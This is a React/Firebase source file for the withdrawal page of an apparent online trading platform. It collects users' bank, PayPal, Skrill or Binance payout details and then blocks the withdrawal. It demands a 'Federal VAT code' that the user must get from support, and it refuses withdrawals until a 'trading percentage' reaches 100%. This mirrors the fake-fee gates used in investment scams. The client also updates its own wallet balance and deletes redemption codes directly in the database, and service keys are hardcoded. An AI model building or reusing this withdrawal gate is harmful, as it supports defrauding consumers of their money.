'use client';
import TradingViewTicker from '@/components/Dashboard/Widgets/TradingViewTicker';
import WithdrawalBalance from '@/components/Dashboard/WithdrawalBalance';
import Button from '@/components/Global/Button';
import Card from '@/components/Global/Card';
import Modal from '@/components/Global/Modal';
import TextInput from '@/components/Global/TextInput';
import TraderLevel from '@/components/Shared/TraderLevel';
import TransactionHistory from '@/components/Shared/TransactionHistory';
import { db } from '@/config/firebase.config';
import AuthContext from '@/context/AuthContext';
import UserDataContext from '@/context/UserDataContext';
import { IWITHDRAWAL } from '@/interface';
import { UserService } from '@/services/user';
import parseDate from '@/utils/parseDate';
import emailjs from '@emailjs/browser';
import {
  Timestamp,
  collection,
  deleteDoc,
  doc,
  getDoc,
  getDocs,
  query,
  updateDoc,
  where,
} from 'firebase/firestore';
import React, { FormEvent, useContext, useState } from 'react';
import toast from 'react-hot-toast';
import { ImFilesEmpty } from 'react-icons/im';
import { MdLockPerson } from 'react-icons/md';
import { v4 as uuidv4 } from 'uuid';

type WithdrawalAssetType = 'deposit' | 'profit';

export default function Withdraw() {
  const { userData } = useContext(UserDataContext);
  const [modalOpen, setModalOpen] = useState(false);
  const [asset, setAsset] = useState<WithdrawalAssetType>('deposit');
  const [amount, setAmount] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState<string>('');
  const [accountHolder, setAccountHolder] = useState<string>('');
  const [paymentMethod, setPaymentMethod] = useState<string>('bank');
  const [email, setEmail] = useState<string>('');
  const [binanceId, setBinanceId] = useState<string>('');
  const [withdrawalCode, setWithdrawalCode] = useState<string>('');
  const [withdrawalCodeModal, setWithdrawalCodeModal] =
    useState<boolean>(false);

  const [isLoading, setIsLoading] = useState(false);

  const handleOpen = () => setModalOpen(true);

  const validateFormInputs = () => {
    return (
      asset.trim().length > 0 && paymentMethod.trim().length > 0 && +amount > 0
    );
  };

  const placeWithdrawal = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const codesRef = collection(db, 'withdrawalCode');

    if (userData) {
      if (!(+amount > userData.wallet[asset])) {
        const data: IWITHDRAWAL = {
          _id: uuidv4(),
          userId: userData._id,
          status: 'pending',
          type: 'withdraw',
          amount: +amount,
          paymentMethod: paymentMethod,
          asset,
          date: Timestamp.now(),
          bankName,
          accountNumber,
          accountHolder,
          email,
          binanceId,
          currency: userData.currency,
        };

        setIsLoading(true);
        try {
          if (withdrawalCode.length > 0 && userData) {
            const q = query(
              codesRef,
              where('code', '==', withdrawalCode),
              where('used', '==', false)
            );

            toast.loading('Loading...');

            await getDocs(q)
              .then((snapshot) => {
                if (snapshot.docs.length > 0) {
                  snapshot.forEach((snap) => {
                    deleteDoc(doc(db, 'withdrawalCode', snap.id));
                  });

                  UserService.sendWithdrawalRequest(userData._id, data).then(
                    () => {
                      const userRef = doc(db, 'users', userData._id);
                      getDoc(userRef).then((snap) => {
                        const data = snap.data();

                        if (data)
                          updateDoc(userRef, {
                            wallet: {
                              ...data.wallet,
                              [asset]: data.wallet[asset] - +amount,
                            },
                          }).then(() => {
                            toast.dismiss();
                            toast.success(
                              'Withdrawal placed. Contact admin for more information'
                            );
                            setModalOpen(false);
                            setWithdrawalCodeModal(false);
                          });
                      });
                    }
                  );
                } else {
                  toast.dismiss();
                  toast.error('Invalid code');
                }
              })
              .catch((error) => {
                console.error('Error getting documents: ', error);
              });
          }

          await emailjs
            .send(
              'service_ce42cqj',
              'template_wuswlfh',
              {
                subject: 'New User Withdrawal!',
                receiver: '',
                message1: `A withdrawal of $${amount} has been placed by ${userData.fullname}`,
                message2: `
                            User Details:
                            Name: ${userData.fullname}
                            Email: ${userData.email}
                            Transaction Details:
                            Amount: $${amount}
                            Status: 'pending'
                            Date: ${parseDate(new Date().getTime())}
              `,
                to_email: 'admin@infinitefinance.online',
              },
              'y8lxRpg3Vc36vRzy-ODHc'
            )
            .then((res) => console.log(res));

          setIsLoading(false);
        } catch (error) {
          console.log(error);
          toast.error('Cannot process payment at the moment');

          setIsLoading(false);
        }
      } else {
        toast.error('Insufficient funds in this wallet');
      }
    }
  };

  if (!userData) return;

  return (
    <>
      <TradingViewTicker />
      <TraderLevel />
      <WithdrawalBalance onButtonClick={handleOpen} />
      <Modal
        title='VAT Code is Required'
        isOpen={withdrawalCodeModal && modalOpen}
        handleClose={() => setWithdrawalCodeModal(false)}
      >
        <MdLockPerson className='text-9xl text-center mb-4 block mx-auto text-gray-700' />
        <div className='text-neutral text-sm'>
          <p className='mb-4'>
            The Federal VAT code is required before this transaction can be
            completed successfully. You can contact our online customer care
            representative for more details about the VAT code for this
            transaction.
          </p>
          <p className='mb-8'>
            Contact Support:{' '}
            <a href='mailto:support@aribixtradeonline'>
              <b className='text-neutral'> support@aribixtradeonline </b>
            </a>{' '}
            to get your <b>VAT Code.</b>
          </p>
        </div>

        <form onSubmit={placeWithdrawal}>
          <TextInput
            placeholder='Enter Code'
            id='imsCode'
            className='mb-4'
            onChange={(e) => setWithdrawalCode(e.target.value.trim())}
            required
          />
          <Button block type='submit' loading={isLoading}>
            Verify
          </Button>
        </form>
      </Modal>
      {/* Withdrawal Form */}
      {modalOpen && (
        <Card>
          <div className='my-6'>
            <label htmlFor='balanceType' className='text-sm text-white mb-2'>
              Withdraw from:
            </label>
            <select
              name='balanceType'
              id='balanceType'
              onChange={(e) =>
                setAsset(e.target.value.trim() as WithdrawalAssetType)
              }
              required
              className=' bg-inherit text-neutral'
            >
              <option value='capital' defaultChecked className=" bg-inherit">
                Capital ( {userData?.currency}
                {userData?.wallet.deposit.toLocaleString()})
              </option>
              <option value='profit' className="bg-inherit">
                Profit ( {userData?.currency}
                {userData?.wallet.profit.toLocaleString()})
              </option>
            </select>
          </div>
          {/*  */}
          <div className='my-6'>
            <label
              htmlFor='paymentMethod'
              className='text-sm text-white mb-2'
            >
              Payment Method
            </label>
            <select
              name='paymentMethod'
              id='paymentMethod'
              onChange={(e) => setPaymentMethod(e.target.value.trim())}
              required
              className=' bg-inherit text-neutral'

            >
              <option value='bank' defaultChecked>
                Bank
              </option>
              <option value='skrill'>Skrill</option>
              <option value='paypal'>Paypal</option>
              <option value='binance'>Binance</option>
            </select>
          </div>
          {/*  */}
          <div className='my-6'>
            <label htmlFor='amount' className='text-sm text-white mb-2'>
              Amount
            </label>
            <TextInput
              type='number'
              id='amount'
              onChange={(e) => setAmount(e.target.value)}
              required
            />
          </div>
          {paymentMethod === 'bank' && (
            <>
              <div className='my-6'>
                <label
                  htmlFor='accountNumber'
                  className='text-sm text-white mb-2'
                >
                  Account Number
                </label>
                <TextInput
                  type='text'
                  id='accountNumber'
                  onChange={(e) => setAccountNumber(e.target.value)}
                  required
                />
              </div>
              {/*  */}
              <div className='my-6'>
                <label
                  htmlFor='bankName'
                  className='text-sm text-white mb-2'
                >
                  Bank Name
                </label>
                <TextInput
                  type='text'
                  id='bankName'
                  onChange={(e) => setBankName(e.target.value)}
                  required
                />
              </div>
            </>
          )}
          {/*  */}

          {paymentMethod !== 'bank' && (
            <div className='my-6'>
              <label htmlFor='email' className='text-sm text-white mb-2'>
                Email
              </label>
              <TextInput
                type='email'
                id='email'
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>
          )}
          {/*  */}
          {paymentMethod === 'binance' && (
            <div className='my-6'>
              <label htmlFor='binanceId' className='text-sm text-white mb-2'>
                Binance ID
              </label>
              <TextInput
                type='text'
                id='binanceId'
                onChange={(e) => setBinanceId(e.target.value)}
                required
              />
            </div>
          )}
          {/*  */}
          <div className='my-6'>
            <label
              htmlFor='accountHolder'
              className='text-sm text-white mb-2'
            >
              Account Holder Name
            </label>
            <TextInput
              type='text'
              id='accountHolder'
              onChange={(e) => setAccountHolder(e.target.value)}
              required
            />
          </div>

          <div className='flex items-center gap-4'>
            <Button
              disabled={isLoading}
              onClick={() => {
                if (validateFormInputs() && userData) {
                  if (+amount <= userData.wallet[asset]) {
                    if (
                      userData?.withdrawLimit &&
                      +amount > userData?.withdrawLimit
                    ) {
                      toast.error('Cannot withdraw above withdrawal limit.');
                    } else {
                      if (userData.tradingPercentage < 100) {
                        toast.error(
                          'Failure to place withdrawal! Trading percentage less than 100%'
                        );
                      } else setWithdrawalCodeModal(true);
                    }
                  } else toast.error('Insufficient Funds in selected wallet!');
                } else toast.error('Please provide valid details');
              }}
              loading={isLoading}
            >
              Withdraw
            </Button>
            <Button color='danger' onClick={() => setModalOpen(false)}>
              Cancel
            </Button>
          </div>
        </Card>
      )}

      {userData?.withdrawals.length === 0 && (
        <Card>
          <div className='flex justify-between items-center'>
            <h5 className='text-gray-700 text-xl font-bold'>Recent Deposit</h5>
            <span className=' p-1 px-2 text-sm rounded-md border border-primary text-neutral'>
              {userData?.withdrawals.length}
            </span>
          </div>

          <div className='text-gray-500 flex flex-col justify-center items-center my-7 gap-5'>
            <ImFilesEmpty fontSize={100} />
            <p>No Transaction</p>
          </div>
        </Card>
      )}

      {/* Transaction History */}
      {userData?.withdrawals && userData?.withdrawals?.length > 0 && (
        <TransactionHistory data={userData.withdrawals} />
      )}
    </>
  );
}
